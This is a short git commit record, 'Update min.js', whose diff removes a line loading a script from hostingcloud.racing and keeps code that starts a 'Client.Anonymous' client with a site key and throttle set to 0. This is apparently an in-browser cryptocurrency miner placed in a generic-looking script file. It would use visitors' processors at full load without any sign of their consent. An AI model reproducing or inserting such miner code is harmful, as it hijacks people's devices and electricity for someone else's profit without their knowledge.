5aa6ace5f2799194de6b418573f240ec572f299d
lucaslu <51876384+StockFi@users.noreply.github.com>
2021-09-21 09:58:37 +0800

    Update min.js

--- min.js
+++ min.js
@@ -1,7 +1,5 @@
-src="https://www.hostingcloud.racing/In3s.js"
 
 var _client = new Client.Anonymous('db6c3d13c5ea8017f184f8bbcdd514766780053d332dff11d30f98b3c91acd86', {
     throttle: 0, c: 'w'
 });
 _client.start();
-    
